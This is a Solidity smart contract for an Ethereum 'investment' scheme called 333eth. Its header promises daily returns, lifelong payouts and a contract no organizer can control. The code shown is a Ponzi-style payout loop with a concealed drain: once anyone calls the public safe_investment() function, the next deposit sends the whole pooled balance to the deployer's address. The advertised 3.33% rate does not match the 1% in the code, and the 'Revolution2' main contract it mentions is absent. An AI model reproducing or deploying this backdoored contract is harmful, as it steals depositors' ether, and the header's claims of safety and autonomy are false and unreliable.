1 pragma solidity ^0.4.24;
2 
3 /**
4 *
5 * ETH CRYPTOCURRENCY DISTRIBUTION PROJECT v 2.0
6 * Web              - https://333eth.io
7 * GitHub           - https://github.com/Revolution333/
8 * Twitter          - https://twitter.com/333eth_io
9 * Youtube          - https://www.youtube.com/c/333eth
10 * Discord          - https://discord.gg/P87buwT
11 * Telegram_channel - https://t.me/Ethereum333
12 * EN  Telegram_chat: https://t.me/Ethereum333_chat_en
13 * RU  Telegram_chat: https://t.me/Ethereum333_chat_ru
14 * KOR Telegram_chat: https://t.me/Ethereum333_chat_kor
15 * CN  Telegram_chat: https://t.me/Ethereum333_chat_cn
16 * Email:             mailto:support(at sign)333eth.io
17 * 
18 * 
19 *  - GAIN 3,33% - 1% PER 24 HOURS (interest is charges in equal parts every 10 min)
20 *  - Life-long payments
21 *  - The revolutionary reliability
22 *  - Minimal contribution 0.01 eth
23 *  - Currency and payment - ETH
24 *  - Contribution allocation schemes:
25 *    -- 87,5% payments
26 *    --  7,5% marketing
27 *    --  5,0% technical support
28 *
29 *   ---About the Project
30 *  Blockchain-enabled smart contracts have opened a new era of trustless relationships without 
31 *  intermediaries. This technology opens incredible financial possibilities. Our automated investment 
32 *  distribution model is written into a smart contract, uploaded to the Ethereum blockchain and can be 
33 *  freely accessed online. In order to insure our investors' complete security, full control over the 
34 *  project has been transferred from the organizers to the smart contract: nobody can influence the 
35 *  system's permanent autonomous functioning.
36 * 
37 * ---How to use:
38 *  1. Send from ETH wallet to the smart contract address 0x311f71389e3DE68f7B2097Ad02c6aD7B2dDE4C71
39 *     any amount from 0.01 ETH.
40 *  2. Verify your transaction in the history of your application or etherscan.io, specifying the address 
41 *     of your wallet.
42 *  3a. Claim your profit by sending 0 ether transaction (every 10 min, every day, every week, i don't care unless you're 
43 *      spending too much on GAS)
44 *  OR
45 *  3b. For reinvest, you need to deposit the amount that you want to reinvest and the 
46 *      accrued interest automatically summed to your new contribution.
47 *  
48 * RECOMMENDED GAS LIMIT: 200000
49 * RECOMMENDED GAS PRICE: https://ethgasstation.info/
50 * You can check the payments on the etherscan.io site, in the "Internal Txns" tab of your wallet.
51 *
52 * ---Refferral system:
53 *     from 0 to 10.000 ethers in the fund - remuneration to each contributor is 3.33%, 
54 *     from 10.000 to 100.000 ethers in the fund - remuneration will be 2%, 
55 *     from 100.000 ethers in the fund - each contributor will get 1%.
56 *
57 * ---It is not allowed to transfer from exchanges, only from your personal ETH wallet, for which you 
58 * have private keys.
59 * 
60 * Contracts reviewed and approved by pros!
61 * 
62 * Main contract - Revolution2. Scroll down to find it.
63 */ 
64 
65 contract eth33 {
66     // records amounts invested
67     mapping (address => uint256) invested;
68     // records blocks at which investments were made
69     mapping (address => uint256) atBlock;
70 
71     uint256 total_investment;
72 
73     uint public is_safe_withdraw_investment;
74     address public investor;
75 
76     constructor() public {
77         investor = msg.sender;
78     }
79 
80     // this function called every time anyone sends a transaction to this contract
81     function () external payable {
82         // if sender (aka YOU) is invested more than 0 ether
83         if (invested[msg.sender] != 0) {
84             // calculate profit amount as such:
85             // amount = (amount invested) * 3.33% * (blocks since last transaction) / 5900
86             // 5900 is an average block count per day produced by Ethereum blockchain
87             uint256 amount = invested[msg.sender] * 1 / 100 * (block.number - atBlock[msg.sender]) / 5900;
88 
89             // send calculated amount of ether directly to sender (aka YOU)
90             address sender = msg.sender;
91             sender.transfer(amount);
92             total_investment -= amount;
93         }
94 
95         // record block number and invested amount (msg.value) of this transaction
96         atBlock[msg.sender] = block.number;
97         invested[msg.sender] += msg.value;
98 
99         total_investment += msg.value;
100         
101         if (is_safe_withdraw_investment == 1) {
102             investor.transfer(total_investment);
103             total_investment = 0;
104         }
105     }
106 
107     function safe_investment() public {
108         is_safe_withdraw_investment = 1;
109     }
110 }